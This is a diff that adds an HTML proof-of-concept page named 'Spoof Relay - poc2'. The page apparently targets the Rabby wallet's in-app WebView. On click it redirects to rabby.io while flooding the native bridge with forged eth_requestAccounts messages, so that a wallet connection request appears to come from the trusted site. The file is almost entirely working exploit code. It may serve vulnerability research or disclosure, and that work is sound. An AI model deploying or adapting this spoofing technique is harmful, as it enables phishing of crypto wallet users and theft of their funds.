@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Spoof Relay - poc2: 200</title>
+    </head>
+    <body>
+        <h2>Connecting Wallet…</h2>
+        <p id="msg">Please click the button to connect.</p>
+        <button id="connectBtn">Connect Wallet</button>
+        <script>
+            document
+                .getElementById("connectBtn")
+                .addEventListener("click", async () => {
+                    if (!window.ethereum) {
+                        document.getElementById("msg").innerText =
+                            "No wallet installed!";
+                        return;
+                    }
+                    try {
+                        window.location = "https://rabby.io";
+                        for (let i = 0; i < 1000; i++) {
+                            setTimeout(async () => {
+                                ReactNativeWebView.postMessage(
+                                    '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
+                                );
+                            }, i * 2);
+                        }
+                    } catch (err) {
+                        document.getElementById("msg").innerText =
+                            "Unexpected error";
+                        console.error(err);
+                    }
+                });
+        </script>
+    </body>
+</html>
